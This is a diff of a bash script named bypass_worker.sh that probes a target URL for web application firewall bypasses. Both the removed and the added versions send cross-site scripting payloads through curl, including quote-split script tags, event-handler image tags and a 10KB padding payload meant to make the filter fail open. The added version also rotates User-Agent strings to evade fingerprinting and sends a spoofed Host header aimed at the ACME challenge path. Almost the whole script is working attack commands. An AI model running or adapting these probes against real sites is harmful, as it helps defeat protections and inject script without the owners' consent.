@@ -1,24 +1,21 @@
 #!/bin/bash
-# [WITCH-HUNTER] BYPASS_WORKER.SH - TCM METHODOLOGY
-# Memorized Logic: Pivot [00:05:32], Pad [00:07:13], Desync [00:09:00]
-
+# [WITCH-HUNTER] BYPASS_WORKER.SH - 2026 HYPOTHESIS
 TARGET=$1
-[ -z "$TARGET" ] && echo "Usage: bypass_worker.sh <url>" && exit 1
 
-echo "--- [ STARTING TCM BYPASS PROBE: $TARGET ] ---"
+echo "--- [ STARTING 2026 WAF AUDIT: $TARGET ] ---"
 
-# 1. ATTRIBUTE PIVOT (Mouseover Bypass)
-echo "[+] Probing: Attribute Pivot (onmouseover)..."
-curl -X GET "$TARGET?q=<img src=x onmouseover=prompt(1)>" -s -o /dev/null -w "Result Code: %{http_code}\n"
+# 1. TLS FINGERPRINT EVASION (User-Agent Rotation) [1.1]
+echo "[+] Rotating Fingerprints (Residential Proxy Simulation)..."
+UA_LIST=("Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)")
+RANDOM_UA=${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}
 
-# 2. PAYLOAD PADDING (10KB Buffer Bypass)
-echo "[+] Probing: 10KB Payload Padding..."
-PADDING=$(printf 'A%.0s' {1..10000})
-PAYLOAD="${PADDING}<img src=x onerror=prompt(1)>"
-curl -X POST -d "q=$PAYLOAD" "$TARGET" -s -o /dev/null -w "Result Code: %{http_code}\n"
+# 2. THE 10KB PADDING (Fail-Open Test) [00:07:13]
+echo "[+] Testing 10KB Padding..."
+PADDING=$(printf 'A%.0s' {1..10240})
+curl -X POST -A "$RANDOM_UA" -d "data=$PADDING<img src=x onerror=prompt(1)>" "$TARGET" -s -o /dev/null -w "Result: %{http_code}\n"
 
-# 3. INTERPRETER DESYNC (Quote Splitting)
-echo "[+] Probing: Interpreter Desync (s'c'r'i'p't)..."
-curl -X GET "$TARGET?q=<s'c'r'i'p't>alert(1)</s'c'r'i'p't>" -s -o /dev/null -w "Result Code: %{http_code}\n"
+# 3. ACME TOKEN DESYNC (Logic Test) [1.4]
+echo "[+] Testing ACME Token Logic Bypass..."
+curl -X GET -H "Host: .well-known/acme-challenge/test-token" "$TARGET" -s -o /dev/null -w "Result: %{http_code}\n"
 
-echo "--- [ PROBE COMPLETE ] ---"
+echo "--- [ AUDIT COMPLETE ] ---"
